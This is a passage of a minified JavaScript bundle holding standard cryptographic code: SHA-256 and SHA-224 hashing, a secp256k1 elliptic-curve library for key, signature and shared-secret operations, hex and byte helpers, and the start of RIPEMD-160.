                n = A(e, 7) ^ A(e, 18) ^ (e >>> 3),
                r = A(t, 17) ^ A(t, 19) ^ (t >>> 10);
              N[f] = (r + N[f - 7] + n + N[f - 16]) | 0;
            }
            let { A: n, B: r, C: i, D: o, E: s, F: a, G: l, H: c } = this;
            for (let f = 0; f < 64; f++) {
              const e =
                  (c +
                    (A(s, 6) ^ A(s, 11) ^ A(s, 25)) +
                    (((u = s) & a) ^ (~u & l)) +
                    _[f] +
                    N[f]) |
                  0,
                t = ((A(n, 2) ^ A(n, 13) ^ A(n, 22)) + P(n, r, i)) | 0;
              (c = l),
                (l = a),
                (a = s),
                (s = (o + e) | 0),
                (o = i),
                (i = r),
                (r = n),
                (n = (e + t) | 0);
            }
            var u;
            (n = (n + this.A) | 0),
              (r = (r + this.B) | 0),
              (i = (i + this.C) | 0),
              (o = (o + this.D) | 0),
              (s = (s + this.E) | 0),
              (a = (a + this.F) | 0),
              (l = (l + this.G) | 0),
              (c = (c + this.H) | 0),
              this.set(n, r, i, o, s, a, l, c);
          }
          roundClean() {
            N.fill(0);
          }
          destroy() {
            this.set(0, 0, 0, 0, 0, 0, 0, 0), this.buffer.fill(0);
          }
        }
        class L extends R {
          constructor() {
            super(),
              (this.A = -1056596264),
              (this.B = 914150663),
              (this.C = 812702999),
              (this.D = -150054599),
              (this.E = -4191439),
              (this.F = 1750603025),
              (this.G = 1694076839),
              (this.H = -1090891868),
              (this.outputLen = 28);
          }
        }
        const $ = C(() => new R());
        C(() => new L());
        var H = n(4471),
          D = n.t(H, 2);
        const M = BigInt(0),
          F = BigInt(1),
          j = BigInt(2),
          z = BigInt(3),
          K = BigInt(8),
          W = Object.freeze({
            a: M,
            b: BigInt(7),
            P: BigInt(
              "0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f"
            ),
            n: BigInt(
              "0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141"
            ),
            h: F,
            Gx: BigInt(
              "55066263022277343669578718895168534326250603453777594175500187360389116729240"
            ),
            Gy: BigInt(
              "32670510020758816978083085130507043184471273380659243275938904335757337482424"
            ),
            beta: BigInt(
              "0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee"
            ),
          }),
          V = (e, t) => (e + t / j) / t,
          q = {
            beta: BigInt(
              "0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee"
            ),
            splitScalar(e) {
              const { n: t } = W,
                n = BigInt("0x3086d221a7d46bcde86c90e49284eb15"),
                r = -F * BigInt("0xe4437ed6010e88286f547fa90abfe4c3"),
                i = BigInt("0x114ca50f7a8e2f3f657c1108d9d44cfd8"),
                o = n,
                s = BigInt("0x100000000000000000000000000000000"),
                a = V(o * e, t),
                l = V(-r * e, t);
              let c = Se(e - a * n - l * i, t),
                u = Se(-a * r - l * o, t);
              const f = c > s,
                h = u > s;
              if ((f && (c = t - c), h && (u = t - u), c > s || u > s))
                throw new Error("splitScalarEndo: Endomorphism failed, k=" + e);
              return { k1neg: f, k1: c, k2neg: h, k2: u };
            },
          },
          G = 32,
          Y = 32,
          Z = 32,
          J = G + 1,
          X = 2 * G + 1;
        function Q(e) {
          const { a: t, b: n } = W,
            r = Se(e * e),
            i = Se(r * e);
          return Se(i + t * e + n);
        }
        const ee = W.a === M;
        class te extends Error {
          constructor(e) {
            super(e);
          }
        }
        function ne(e) {
          if (!(e instanceof re)) throw new TypeError("JacobianPoint expected");
        }
        class re {
          constructor(e, t, n) {
            (this.x = e), (this.y = t), (this.z = n);
          }
          static fromAffine(e) {
            if (!(e instanceof se))
              throw new TypeError("JacobianPoint#fromAffine: expected Point");
            return e.equals(se.ZERO) ? re.ZERO : new re(e.x, e.y, F);
          }
          static toAffineBatch(e) {
            const t = (function (e) {
              let t =
                arguments.length > 1 && void 0 !== arguments[1]
                  ? arguments[1]
                  : W.P;
              const n = new Array(e.length),
                r = Ae(
                  e.reduce(
                    (e, r, i) => (r === M ? e : ((n[i] = e), Se(e * r, t))),
                    F
                  ),
                  t
                );
              return (
                e.reduceRight(
                  (e, r, i) =>
                    r === M ? e : ((n[i] = Se(e * n[i], t)), Se(e * r, t)),
                  r
                ),
                n
              );
            })(e.map((e) => e.z));
            return e.map((e, n) => e.toAffine(t[n]));
          }
          static normalizeZ(e) {
            return re.toAffineBatch(e).map(re.fromAffine);
          }
          equals(e) {
            ne(e);
            const { x: t, y: n, z: r } = this,
              { x: i, y: o, z: s } = e,
              a = Se(r * r),
              l = Se(s * s),
              c = Se(t * l),
              u = Se(i * a),
              f = Se(Se(n * s) * l),
              h = Se(Se(o * r) * a);
            return c === u && f === h;
          }
          negate() {
            return new re(this.x, Se(-this.y), this.z);
          }
          double() {
            const { x: e, y: t, z: n } = this,
              r = Se(e * e),
              i = Se(t * t),
              o = Se(i * i),
              s = e + i,
              a = Se(j * (Se(s * s) - r - o)),
              l = Se(z * r),
              c = Se(l * l),
              u = Se(c - j * a),
              f = Se(l * (a - u) - K * o),
              h = Se(j * t * n);
            return new re(u, f, h);
          }
          add(e) {
            ne(e);
            const { x: t, y: n, z: r } = this,
              { x: i, y: o, z: s } = e;
            if (i === M || o === M) return this;
            if (t === M || n === M) return e;
            const a = Se(r * r),
              l = Se(s * s),
              c = Se(t * l),
              u = Se(i * a),
              f = Se(Se(n * s) * l),
              h = Se(Se(o * r) * a),
              d = Se(u - c),
              p = Se(h - f);
            if (d === M) return p === M ? this.double() : re.ZERO;
            const g = Se(d * d),
              y = Se(d * g),
              w = Se(c * g),
              m = Se(p * p - y - j * w),
              b = Se(p * (w - m) - f * y),
              v = Se(r * s * d);
            return new re(m, b, v);
          }
          subtract(e) {
            return this.add(e.negate());
          }
          multiplyUnsafe(e) {
            const t = re.ZERO;
            if ("bigint" === typeof e && e === M) return t;
            let n = Ee(e);
            if (n === F) return this;
            if (!ee) {
              let e = t,
                r = this;
              for (; n > M; )
                n & F && (e = e.add(r)), (r = r.double()), (n >>= F);
              return e;
            }
            let { k1neg: r, k1: i, k2neg: o, k2: s } = q.splitScalar(n),
              a = t,
              l = t,
              c = this;
            for (; i > M || s > M; )
              i & F && (a = a.add(c)),
                s & F && (l = l.add(c)),
                (c = c.double()),
                (i >>= F),
                (s >>= F);
            return (
              r && (a = a.negate()),
              o && (l = l.negate()),
              (l = new re(Se(l.x * q.beta), l.y, l.z)),
              a.add(l)
            );
          }
          precomputeWindow(e) {
            const t = ee ? 128 / e + 1 : 256 / e + 1,
              n = [];
            let r = this,
              i = r;
            for (let o = 0; o < t; o++) {
              (i = r), n.push(i);
              for (let t = 1; t < 2 ** (e - 1); t++) (i = i.add(r)), n.push(i);
              r = i.double();
            }
            return n;
          }
          wNAF(e, t) {
            !t && this.equals(re.BASE) && (t = se.BASE);
            const n = (t && t._WINDOW_SIZE) || 1;
            if (256 % n)
              throw new Error(
                "Point#wNAF: Invalid precomputation window, must be power of 2"
              );
            let r = t && oe.get(t);
            r ||
              ((r = this.precomputeWindow(n)),
              t && 1 !== n && ((r = re.normalizeZ(r)), oe.set(t, r)));
            let i = re.ZERO,
              o = re.BASE;
            const s = 1 + (ee ? 128 / n : 256 / n),
              a = 2 ** (n - 1),
              l = BigInt(2 ** n - 1),
              c = 2 ** n,
              u = BigInt(n);
            for (let f = 0; f < s; f++) {
              const t = f * a;
              let n = Number(e & l);
              (e >>= u), n > a && ((n -= c), (e += F));
              const s = t,
                h = t + Math.abs(n) - 1,
                d = f % 2 !== 0,
                p = n < 0;
              0 === n ? (o = o.add(ie(d, r[s]))) : (i = i.add(ie(p, r[h])));
            }
            return { p: i, f: o };
          }
          multiply(e, t) {
            let n,
              r,
              i = Ee(e);
            if (ee) {
              const { k1neg: e, k1: o, k2neg: s, k2: a } = q.splitScalar(i);
              let { p: l, f: c } = this.wNAF(o, t),
                { p: u, f: f } = this.wNAF(a, t);
              (l = ie(e, l)),
                (u = ie(s, u)),
                (u = new re(Se(u.x * q.beta), u.y, u.z)),
                (n = l.add(u)),
                (r = c.add(f));
            } else {
              const { p: e, f: o } = this.wNAF(i, t);
              (n = e), (r = o);
            }
            return re.normalizeZ([n, r])[0];
          }
          toAffine(e) {
            const { x: t, y: n, z: r } = this,
              i = this.equals(re.ZERO);
            null == e && (e = i ? K : Ae(r));
            const o = e,
              s = Se(o * o),
              a = Se(s * o),
              l = Se(t * s),
              c = Se(n * a),
              u = Se(r * o);
            if (i) return se.ZERO;
            if (u !== F) throw new Error("invZ was invalid");
            return new se(l, c);
          }
        }
        function ie(e, t) {
          const n = t.negate();
          return e ? n : t;
        }
        (re.BASE = new re(W.Gx, W.Gy, F)), (re.ZERO = new re(M, F, M));
        const oe = new WeakMap();
        class se {
          constructor(e, t) {
            (this.x = e), (this.y = t);
          }
          _setWindowSize(e) {
            (this._WINDOW_SIZE = e), oe.delete(this);
          }
          hasEvenY() {
            return this.y % j === M;
          }
          static fromCompressedHex(e) {
            const t = 32 === e.length,
              n = be(t ? e : e.subarray(1));
            if (!Be(n)) throw new Error("Point is not on curve");
            let r = (function (e) {
              const { P: t } = W,
                n = BigInt(6),
                r = BigInt(11),
                i = BigInt(22),
                o = BigInt(23),
                s = BigInt(44),
                a = BigInt(88),
                l = (e * e * e) % t,
                c = (l * l * e) % t,
                u = (xe(c, z) * c) % t,
                f = (xe(u, z) * c) % t,
                h = (xe(f, j) * l) % t,
                d = (xe(h, r) * h) % t,
                p = (xe(d, i) * d) % t,
                g = (xe(p, s) * p) % t,
                y = (xe(g, a) * g) % t,
                w = (xe(y, s) * p) % t,
                m = (xe(w, z) * c) % t,
                b = (xe(m, o) * d) % t,
                v = (xe(b, n) * l) % t,
                E = xe(v, j);
              if ((E * E) % t !== e) throw new Error("Cannot find square root");
              return E;
            })(Q(n));
            const i = (r & F) === F;
            if (t) i && (r = Se(-r));
            else {
              (1 === (1 & e[0])) !== i && (r = Se(-r));
            }
            const o = new se(n, r);
            return o.assertValidity(), o;
          }
          static fromUncompressedHex(e) {
            const t = be(e.subarray(1, G + 1)),
              n = be(e.subarray(G + 1, 2 * G + 1)),
              r = new se(t, n);
            return r.assertValidity(), r;
          }
          static fromHex(e) {
            const t = ve(e),
              n = t.length,
              r = t[0];
            if (n === G) return this.fromCompressedHex(t);
            if (n === J && (2 === r || 3 === r))
              return this.fromCompressedHex(t);
            if (n === X && 4 === r) return this.fromUncompressedHex(t);
            throw new Error(
              `Point.fromHex: received invalid point. Expected 32-${J} compressed bytes or ${X} uncompressed bytes, not ${n}`
            );
          }
          static fromPrivateKey(e) {
            return se.BASE.multiply(_e(e));
          }
          static fromSignature(e, t, n) {
            const { r: r, s: i } = Ne(t);
            if (![0, 1, 2, 3].includes(n))
              throw new Error("Cannot recover: invalid recovery bit");
            const o = ke(ve(e)),
              { n: s } = W,
              a = 2 === n || 3 === n ? r + s : r,
              l = Ae(a, s),
              c = Se(-o * l, s),
              u = Se(i * l, s),
              f = 1 & n ? "03" : "02",
              h = se.fromHex(f + pe(a)),
              d = se.BASE.multiplyAndAddUnsafe(h, c, u);
            if (!d)
              throw new Error("Cannot recover signature: point at infinify");
            return d.assertValidity(), d;
          }
          toRawBytes() {
            let e =
              arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
            return me(this.toHex(e));
          }
          toHex() {
            let e =
              arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
            const t = pe(this.x);
            if (e) {
              return `${this.hasEvenY() ? "02" : "03"}${t}`;
            }
            return `04${t}${pe(this.y)}`;
          }
          toHexX() {
            return this.toHex(!0).slice(2);
          }
          toRawX() {
            return this.toRawBytes(!0).slice(1);
          }
          assertValidity() {
            const e = "Point is not on elliptic curve",
              { x: t, y: n } = this;
            if (!Be(t) || !Be(n)) throw new Error(e);
            const r = Se(n * n);
            if (Se(r - Q(t)) !== M) throw new Error(e);
          }
          equals(e) {
            return this.x === e.x && this.y === e.y;
          }
          negate() {
            return new se(this.x, Se(-this.y));
          }
          double() {
            return re.fromAffine(this).double().toAffine();
          }
          add(e) {
            return re.fromAffine(this).add(re.fromAffine(e)).toAffine();
          }
          subtract(e) {
            return this.add(e.negate());
          }
          multiply(e) {
            return re.fromAffine(this).multiply(e, this).toAffine();
          }
          multiplyAndAddUnsafe(e, t, n) {
            const r = re.fromAffine(this),
              i =
                t === M || t === F || this !== se.BASE
                  ? r.multiplyUnsafe(t)
                  : r.multiply(t),
              o = re.fromAffine(e).multiplyUnsafe(n),
              s = i.add(o);
            return s.equals(re.ZERO) ? void 0 : s.toAffine();
          }
        }
        function ae(e) {
          return Number.parseInt(e[0], 16) >= 8 ? "00" + e : e;
        }
        function le(e) {
          if (e.length < 2 || 2 !== e[0])
            throw new Error(`Invalid signature integer tag: ${he(e)}`);
          const t = e[1],
            n = e.subarray(2, t + 2);
          if (!t || n.length !== t)
            throw new Error("Invalid signature integer: wrong length");
          if (0 === n[0] && n[1] <= 127)
            throw new Error("Invalid signature integer: trailing length");
          return { data: be(n), left: e.subarray(t + 2) };
        }
        (se.BASE = new se(W.Gx, W.Gy)), (se.ZERO = new se(M, M));
        class ce {
          constructor(e, t) {
            (this.r = e), (this.s = t), this.assertValidity();
          }
          static fromCompact(e) {
            const t = e instanceof Uint8Array,
              n = "Signature.fromCompact";
            if ("string" !== typeof e && !t)
              throw new TypeError(`${n}: Expected string or Uint8Array`);
            const r = t ? he(e) : e;
            if (128 !== r.length) throw new Error(`${n}: Expected 64-byte hex`);
            return new ce(we(r.slice(0, 64)), we(r.slice(64, 128)));
          }
          static fromDER(e) {
            const t = e instanceof Uint8Array;
            if ("string" !== typeof e && !t)
              throw new TypeError(
                "Signature.fromDER: Expected string or Uint8Array"
              );
            const { r: n, s: r } = (function (e) {
              if (e.length < 2 || 48 != e[0])
                throw new Error(`Invalid signature tag: ${he(e)}`);
              if (e[1] !== e.length - 2)
                throw new Error("Invalid signature: incorrect length");
              const { data: t, left: n } = le(e.subarray(2)),
                { data: r, left: i } = le(n);
              if (i.length)
                throw new Error(
                  `Invalid signature: left bytes after parsing: ${he(i)}`
                );
              return { r: t, s: r };
            })(t ? e : me(e));
            return new ce(n, r);
          }
          static fromHex(e) {
            return this.fromDER(e);
          }
          assertValidity() {
            const { r: e, s: t } = this;
            if (!Oe(e))
              throw new Error("Invalid Signature: r must be 0 < r < n");
            if (!Oe(t))
              throw new Error("Invalid Signature: s must be 0 < s < n");
          }
          hasHighS() {
            const e = W.n >> F;
            return this.s > e;
          }
          normalizeS() {
            return this.hasHighS() ? new ce(this.r, Se(-this.s, W.n)) : this;
          }
          toDERRawBytes() {
            return me(this.toDERHex());
          }
          toDERHex() {
            const e = ae(ye(this.s)),
              t = ae(ye(this.r)),
              n = e.length / 2,
              r = t.length / 2,
              i = ye(n),
              o = ye(r);
            return `30${ye(r + n + 4)}02${o}${t}02${i}${e}`;
          }
          toRawBytes() {
            return this.toDERRawBytes();
          }
          toHex() {
            return this.toDERHex();
          }
          toCompactRawBytes() {
            return me(this.toCompactHex());
          }
          toCompactHex() {
            return pe(this.r) + pe(this.s);
          }
        }
        function ue() {
          for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++)
            t[n] = arguments[n];
          if (!t.every((e) => e instanceof Uint8Array))
            throw new Error("Uint8Array list expected");
          if (1 === t.length) return t[0];
          const r = t.reduce((e, t) => e + t.length, 0),
            i = new Uint8Array(r);
          for (let o = 0, s = 0; o < t.length; o++) {
            const e = t[o];
            i.set(e, s), (s += e.length);
          }
          return i;
        }
        const fe = Array.from({ length: 256 }, (e, t) =>
          t.toString(16).padStart(2, "0")
        );
        function he(e) {
          if (!(e instanceof Uint8Array))
            throw new Error("Expected Uint8Array");
          let t = "";
          for (let n = 0; n < e.length; n++) t += fe[e[n]];
          return t;
        }
        const de = BigInt(
          "0x10000000000000000000000000000000000000000000000000000000000000000"
        );
        function pe(e) {
          if ("bigint" !== typeof e) throw new Error("Expected bigint");
          if (!(M <= e && e < de))
            throw new Error("Expected number 0 <= n < 2^256");
          return e.toString(16).padStart(64, "0");
        }
        function ge(e) {
          const t = me(pe(e));
          if (32 !== t.length) throw new Error("Error: expected 32 bytes");
          return t;
        }
        function ye(e) {
          const t = e.toString(16);
          return 1 & t.length ? `0${t}` : t;
        }
        function we(e) {
          if ("string" !== typeof e)
            throw new TypeError(
              "hexToNumber: expected string, got " + typeof e
            );
          return BigInt(`0x${e}`);
        }
        function me(e) {
          if ("string" !== typeof e)
            throw new TypeError("hexToBytes: expected string, got " + typeof e);
          if (e.length % 2)
            throw new Error(
              "hexToBytes: received invalid unpadded hex" + e.length
            );
          const t = new Uint8Array(e.length / 2);
          for (let n = 0; n < t.length; n++) {
            const r = 2 * n,
              i = e.slice(r, r + 2),
              o = Number.parseInt(i, 16);
            if (Number.isNaN(o) || o < 0)
              throw new Error("Invalid byte sequence");
            t[n] = o;
          }
          return t;
        }
        function be(e) {
          return we(he(e));
        }
        function ve(e) {
          return e instanceof Uint8Array ? Uint8Array.from(e) : me(e);
        }
        function Ee(e) {
          if ("number" === typeof e && Number.isSafeInteger(e) && e > 0)
            return BigInt(e);
          if ("bigint" === typeof e && Oe(e)) return e;
          throw new TypeError(
            "Expected valid private scalar: 0 < scalar < curve.n"
          );
        }
        function Se(e) {
          let t =
            arguments.length > 1 && void 0 !== arguments[1]
              ? arguments[1]
              : W.P;
          const n = e % t;
          return n >= M ? n : t + n;
        }
        function xe(e, t) {
          const { P: n } = W;
          let r = e;
          for (; t-- > M; ) (r *= r), (r %= n);
          return r;
        }
        function Ae(e) {
          let t =
            arguments.length > 1 && void 0 !== arguments[1]
              ? arguments[1]
              : W.P;
          if (e === M || t <= M)
            throw new Error(
              `invert: expected positive integers, got n=${e} mod=${t}`
            );
          let n = Se(e, t),
            r = t,
            i = M,
            o = F,
            s = F,
            a = M;
          for (; n !== M; ) {
            const e = r / n,
              t = r % n,
              l = i - s * e,
              c = o - a * e;
            (r = n), (n = t), (i = s), (o = a), (s = l), (a = c);
          }
          if (r !== F) throw new Error("invert: does not exist");
          return Se(i, t);
        }
        function ke(e) {
          let t =
            arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
          const n = (function (e) {
            const t = 8 * e.length - 8 * Y,
              n = be(e);
            return t > 0 ? n >> BigInt(t) : n;
          })(e);
          if (t) return n;
          const { n: r } = W;
          return n >= r ? n - r : n;
        }
        let Te, Ce;
        class Ie {
          constructor(e, t) {
            if (
              ((this.hashLen = e),
              (this.qByteLen = t),
              "number" !== typeof e || e < 2)
            )
              throw new Error("hashLen must be a number");
            if ("number" !== typeof t || t < 2)
              throw new Error("qByteLen must be a number");
            (this.v = new Uint8Array(e).fill(1)),
              (this.k = new Uint8Array(e).fill(0)),
              (this.counter = 0);
          }
          hmac() {
            for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++)
              t[n] = arguments[n];
            return We.hmacSha256(this.k, ...t);
          }
          hmacSync() {
            for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++)
              t[n] = arguments[n];
            return Ce(this.k, ...t);
          }
          checkSync() {
            if ("function" !== typeof Ce)
              throw new te("hmacSha256Sync needs to be set");
          }
          incr() {
            if (this.counter >= 1e3)
              throw new Error(
                "Tried 1,000 k values for sign(), all were invalid"
              );
            this.counter += 1;
          }
          async reseed() {
            let e =
              arguments.length > 0 && void 0 !== arguments[0]
                ? arguments[0]
                : new Uint8Array();
            (this.k = await this.hmac(this.v, Uint8Array.from([0]), e)),
              (this.v = await this.hmac(this.v)),
              0 !== e.length &&
                ((this.k = await this.hmac(this.v, Uint8Array.from([1]), e)),
                (this.v = await this.hmac(this.v)));
          }
          reseedSync() {
            let e =
              arguments.length > 0 && void 0 !== arguments[0]
                ? arguments[0]
                : new Uint8Array();
            this.checkSync(),
              (this.k = this.hmacSync(this.v, Uint8Array.from([0]), e)),
              (this.v = this.hmacSync(this.v)),
              0 !== e.length &&
                ((this.k = this.hmacSync(this.v, Uint8Array.from([1]), e)),
                (this.v = this.hmacSync(this.v)));
          }
          async generate() {
            this.incr();
            let e = 0;
            const t = [];
            for (; e < this.qByteLen; ) {
              this.v = await this.hmac(this.v);
              const n = this.v.slice();
              t.push(n), (e += this.v.length);
            }
            return ue(...t);
          }
          generateSync() {
            this.checkSync(), this.incr();
            let e = 0;
            const t = [];
            for (; e < this.qByteLen; ) {
              this.v = this.hmacSync(this.v);
              const n = this.v.slice();
              t.push(n), (e += this.v.length);
            }
            return ue(...t);
          }
        }
        function Oe(e) {
          return M < e && e < W.n;
        }
        function Be(e) {
          return M < e && e < W.P;
        }
        function Pe(e, t, n) {
          let r =
            !(arguments.length > 3 && void 0 !== arguments[3]) || arguments[3];
          const { n: i } = W,
            o = ke(e, !0);
          if (!Oe(o)) return;
          const s = Ae(o, i),
            a = se.BASE.multiply(o),
            l = Se(a.x, i);
          if (l === M) return;
          const c = Se(s * Se(t + n * l, i), i);
          if (c === M) return;
          let u = new ce(l, c),
            f = (a.x === u.r ? 0 : 2) | Number(a.y & F);
          return (
            r && u.hasHighS() && ((u = u.normalizeS()), (f ^= 1)),
            { sig: u, recovery: f }
          );
        }
        function _e(e) {
          let t;
          if ("bigint" === typeof e) t = e;
          else if ("number" === typeof e && Number.isSafeInteger(e) && e > 0)
            t = BigInt(e);
          else if ("string" === typeof e) {
            if (e.length !== 2 * Y)
              throw new Error("Expected 32 bytes of private key");
            t = we(e);
          } else {
            if (!(e instanceof Uint8Array))
              throw new TypeError("Expected valid private key");
            if (e.length !== Y)
              throw new Error("Expected 32 bytes of private key");
            t = be(e);
          }
          if (!Oe(t)) throw new Error("Expected private key: 0 < key < n");
          return t;
        }
        function Ue(e) {
          return e instanceof se ? (e.assertValidity(), e) : se.fromHex(e);
        }
        function Ne(e) {
          if (e instanceof ce) return e.assertValidity(), e;
          try {
            return ce.fromDER(e);
          } catch (t) {
            return ce.fromCompact(e);
          }
        }
        function Re(e) {
          let t =
            arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
          return se.fromPrivateKey(e).toRawBytes(t);
        }
        function Le(e) {
          const t = e instanceof Uint8Array,
            n = "string" === typeof e,
            r = (t || n) && e.length;
          return t
            ? r === J || r === X
            : n
            ? r === 2 * J || r === 2 * X
            : e instanceof se;
        }
        function $e(e, t) {
          let n =
            arguments.length > 2 && void 0 !== arguments[2] && arguments[2];
          if (Le(e))
            throw new TypeError(
              "getSharedSecret: first arg must be private key"
            );
          if (!Le(t))
            throw new TypeError(
              "getSharedSecret: second arg must be public key"
            );
          const r = Ue(t);
          return r.assertValidity(), r.multiply(_e(e)).toRawBytes(n);
        }
        function He(e) {
          return be(e.length > G ? e.slice(0, G) : e);
        }
        function De(e) {
          const t = He(e),
            n = Se(t, W.n);
          return Me(n < M ? t : n);
        }
        function Me(e) {
          return ge(e);
        }
        function Fe(e, t, n) {
          if (null == e)
            throw new Error(`sign: expected valid message hash, not "${e}"`);
          const r = ve(e),
            i = _e(t),
            o = [Me(i), De(r)];
          if (null != n) {
            !0 === n && (n = We.randomBytes(G));
            const e = ve(n);
            if (e.length !== G)
              throw new Error(`sign: Expected ${G} bytes of extra data`);
            o.push(e);
          }
          return { seed: ue(...o), m: He(r), d: i };
        }
        function je(e, t) {
          const { sig: n, recovery: r } = e,
            { der: i, recovered: o } = Object.assign(
              { canonical: !0, der: !0 },
              t
            ),
            s = i ? n.toDERRawBytes() : n.toCompactRawBytes();
          return o ? [s, r] : s;
        }
        se.BASE._setWindowSize(8);
        const ze = {
            node: D,
            web:
              "object" === typeof self && "crypto" in self
                ? self.crypto
                : void 0,
          },
          Ke = {},
          We = {
            bytesToHex: he,
            hexToBytes: me,
            concatBytes: ue,
            mod: Se,
            invert: Ae,
            isValidPrivateKey(e) {
              try {
                return _e(e), !0;
              } catch (t) {
                return !1;
              }
            },
            _bigintTo32Bytes: ge,
            _normalizePrivateKey: _e,
            hashToPrivateKey: (e) => {
              e = ve(e);
              const t = Y + 8;
              if (e.length < t || e.length > 1024)
                throw new Error(
                  "Expected valid bytes of private key as per FIPS 186"
                );
              return ge(Se(be(e), W.n - F) + F);
            },
            randomBytes: function () {
              let e =
                arguments.length > 0 && void 0 !== arguments[0]
                  ? arguments[0]
                  : 32;
              if (ze.web) return ze.web.getRandomValues(new Uint8Array(e));
              if (ze.node) {
                const { randomBytes: t } = ze.node;
                return Uint8Array.from(t(e));
              }
              throw new Error(
                "The environment doesn't have randomBytes function"
              );
            },
            randomPrivateKey: () => We.hashToPrivateKey(We.randomBytes(Y + 8)),
            precompute() {
              let e =
                  arguments.length > 0 && void 0 !== arguments[0]
                    ? arguments[0]
                    : 8,
                t =
                  arguments.length > 1 && void 0 !== arguments[1]
                    ? arguments[1]
                    : se.BASE;
              const n = t === se.BASE ? t : new se(t.x, t.y);
              return n._setWindowSize(e), n.multiply(z), n;
            },
            sha256: async function () {
              for (
                var e = arguments.length, t = new Array(e), n = 0;
                n < e;
                n++
              )
                t[n] = arguments[n];
              if (ze.web) {
                const e = await ze.web.subtle.digest("SHA-256", ue(...t));
                return new Uint8Array(e);
              }
              if (ze.node) {
                const { createHash: e } = ze.node,
                  n = e("sha256");
                return (
                  t.forEach((e) => n.update(e)), Uint8Array.from(n.digest())
                );
              }
              throw new Error("The environment doesn't have sha256 function");
            },
            hmacSha256: async function (e) {
              for (
                var t = arguments.length,
                  n = new Array(t > 1 ? t - 1 : 0),
                  r = 1;
                r < t;
                r++
              )
                n[r - 1] = arguments[r];
              if (ze.web) {
                const t = await ze.web.subtle.importKey(
                    "raw",
                    e,
                    { name: "HMAC", hash: { name: "SHA-256" } },
                    !1,
                    ["sign"]
                  ),
                  r = ue(...n),
                  i = await ze.web.subtle.sign("HMAC", t, r);
                return new Uint8Array(i);
              }
              if (ze.node) {
                const { createHmac: t } = ze.node,
                  r = t("sha256", e);
                return (
                  n.forEach((e) => r.update(e)), Uint8Array.from(r.digest())
                );
              }
              throw new Error(
                "The environment doesn't have hmac-sha256 function"
              );
            },
            sha256Sync: void 0,
            hmacSha256Sync: void 0,
            taggedHash: async function (e) {
              let t = Ke[e];
              if (void 0 === t) {
                const n = await We.sha256(
                  Uint8Array.from(e, (e) => e.charCodeAt(0))
                );
                (t = ue(n, n)), (Ke[e] = t);
              }
              for (
                var n = arguments.length,
                  r = new Array(n > 1 ? n - 1 : 0),
                  i = 1;
                i < n;
                i++
              )
                r[i - 1] = arguments[i];
              return We.sha256(t, ...r);
            },
            taggedHashSync: function (e) {
              if ("function" !== typeof Te)
                throw new te("sha256Sync is undefined, you need to set it");
              let t = Ke[e];
              if (void 0 === t) {
                const n = Te(Uint8Array.from(e, (e) => e.charCodeAt(0)));
                (t = ue(n, n)), (Ke[e] = t);
              }
              for (
                var n = arguments.length,
                  r = new Array(n > 1 ? n - 1 : 0),
                  i = 1;
                i < n;
                i++
              )
                r[i - 1] = arguments[i];
              return Te(t, ...r);
            },
            _JacobianPoint: re,
          };
        Object.defineProperties(We, {
          sha256Sync: {
            configurable: !1,
            get: () => Te,
            set(e) {
              Te || (Te = e);
            },
          },
          hmacSha256Sync: {
            configurable: !1,
            get: () => Ce,
            set(e) {
              Ce || (Ce = e);
            },
          },
        });
        var Ve = n(9083),
          qe = n(2755),
          Ge = n(6315),
          Ye = n.n(Ge);
        const Ze = new Uint8Array([
            7, 4, 13, 1, 10, 6, 15, 3, 12, 0, 9, 5, 2, 14, 11, 8,
          ]),
          Je = Uint8Array.from({ length: 16 }, (e, t) => t),
          Xe = Je.map((e) => (9 * e + 5) % 16);
        let Qe = [Je],
          et = [Xe];
        for (let an = 0; an < 4; an++)
          for (let e of [Qe, et]) e.push(e[an].map((e) => Ze[e]));
        const tt = [
            [11, 14, 15, 12, 5, 8, 7, 9, 11, 13, 14, 15, 6, 7, 9, 8],
            [12, 13, 11, 15, 6, 9, 9, 7, 12, 15, 11, 13, 7, 8, 7, 7],
            [13, 15, 14, 11, 7, 7, 6, 8, 13, 14, 13, 12, 5, 5, 6, 9],
            [14, 11, 12, 14, 8, 6, 5, 5, 15, 12, 15, 14, 9, 9, 8, 6],
            [15, 12, 13, 13, 9, 5, 8, 6, 14, 11, 12, 11, 8, 6, 5, 5],
          ].map((e) => new Uint8Array(e)),
          nt = Qe.map((e, t) => e.map((e) => tt[t][e])),
          rt = et.map((e, t) => e.map((e) => tt[t][e])),
          it = new Uint32Array([
            0, 1518500249, 1859775393, 2400959708, 2840853838,
          ]),
          ot = new Uint32Array([
            1352829926, 1548603684, 1836072691, 2053994217, 0,
          ]),
          st = (e, t) => (e << t) | (e >>> (32 - t));
        function at(e, t, n, r) {
          return 0 === e
            ? t ^ n ^ r
            : 1 === e
            ? (t & n) | (~t & r)
            : 2 === e
            ? (t | ~n) ^ r
            : 3 === e
            ? (t & r) | (n & ~r)
            : t ^ (n | ~r);
        }
        const lt = new Uint32Array(16);
        class ct extends B {
          constructor() {
            super(64, 20, 8, !0),
              (this.h0 = 1732584193),
              (this.h1 = -271733879),
              (this.h2 = -1732584194),
              (this.h3 = 271733878),
              (this.h4 = -1009589776);
          }
          get() {
            const { h0: e, h1: t, h2: n, h3: r, h4: i } = this;
            return [e, t, n, r, i];
          }
          set(e, t, n, r, i) {
            (this.h0 = 0 | e),
              (this.h1 = 0 | t),
              (this.h2 = 0 | n),
              (this.h3 = 0 | r),
              (this.h4 = 0 | i);
          }
          process(e, t) {
            for (let h = 0; h < 16; h++, t += 4) lt[h] = e.getUint32(t, !0);
            let n = 0 | this.h0,
              r = n,
              i = 0 | this.h1,
              o = i,
              s = 0 | this.h2,
              a = s,
              l = 0 | this.h3,
              c = l,
              u = 0 | this.h4,
              f = u;
            for (let h = 0; h < 5; h++) {
              const e = 4 - h,
                t = it[h],
                d = ot[h],
                p = Qe[h],
                g = et[h],
                y = nt[h],
                w = rt[h];
